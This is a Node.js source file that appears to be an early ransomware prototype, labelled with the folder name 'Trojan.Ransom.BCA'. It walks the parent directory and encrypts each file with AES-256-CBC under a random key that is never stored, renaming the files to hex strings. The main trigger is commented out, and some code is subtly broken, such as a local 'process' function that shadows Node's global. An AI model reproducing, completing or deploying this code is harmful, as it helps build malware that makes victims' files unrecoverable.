const fs = require('fs');
const crypto = require('crypto');
const path = require('path');
const parentDir = __dirname + "/../";
const key = crypto.randomBytes(6).toString('base64');

function encrypt (pathIn) {
    const oldName = pathIn.split('/').pop();
    // const fileName = crypto.randomBytes(9).toString('base64');

    /*let newName = "/";
    while (newName.indexOf("/" > -1)) {
        let tmp = crypto.createCipher('aes-256-cbc', key);
        newName = tmp.update(oldName, 'utf-8', 'base64') + tmp.final('base64');
    }*/

    let tmp = crypto.createCipher('aes-256-cbc', key);
    const newName = tmp.update(oldName, 'utf-8', 'hex') + tmp.final('hex') + "*";
    
    let cipher = crypto.createCipher('aes-256-cbc', key);
    let input = fs.createReadStream(pathIn);
    let output = fs.createWriteStream(parentDir + newName);

    input.pipe(cipher).pipe(output);

    output.on('finish', function() {
        console.log('Encrypted file written to disk!');
    });
}

function decrypt (pathIn) {
    const oldName = pathIn.split('/').pop();
    fs.readFile(pathIn, "binary", function (err, data) {
        if (err) throw err;

        if (oldName.slice(-1) === "*") {
            let tmp = crypto.createDecipher('aes-256-cbc', key);
            const newName = tmp.update(oldName.slice(0, -1), 'hex','utf8') + tmp.final('utf8');

            let decipher = crypto.createDecipher('aes-256-cbc', key);
            let input = fs.createReadStream(pathIn);
            let output = fs.createWriteStream(parentDir + "NEW_" + newName);

            input.pipe(decipher).pipe(output);

            output.on('finish', function() {
                console.log('Decrypted file written to disk!');
            });
        }
    });
}

function search (mode) {
    // Loop through all the files in the temp directory
    fs.readdir( parentDir, function( err, files ) {
        if( err ) {
            console.error("Could not list the directory.", err );
            process.exit( 1 );
        }

        files.forEach( function( file, index ) {
            // Make one pass and make the file complete
            let fromPath = path.join( parentDir, file );

            fs.stat( fromPath, function( error, stat ) {
                if( error ) {
                    console.error( "Error stating file.", error );
                    return;
                }

                if( stat.isFile() ) {
                    console.log( "'%s' is a file.", fromPath );

                    let extension = file.split('.').pop();
                    if (file !== ".DS_Store" && extension !== "app" && extension !== "localized" && extension !== "ini") {
                        if (mode === 0) encrypt(fromPath); else decrypt(fromPath);
                    }
                } else if(stat.isDirectory()) {
                    console.log( "'%s' is a directory.", fromPath );
                    if (file !== "Trojan.Ransom.BCA")
                        return;
                }

            } );
        } );
    } );
}

function process () {
    // search(0);
/*    encrypt();
    setTimeout(decrypt, 1000);*/
}

module.exports = {
    process: function () {
        process();
    }
};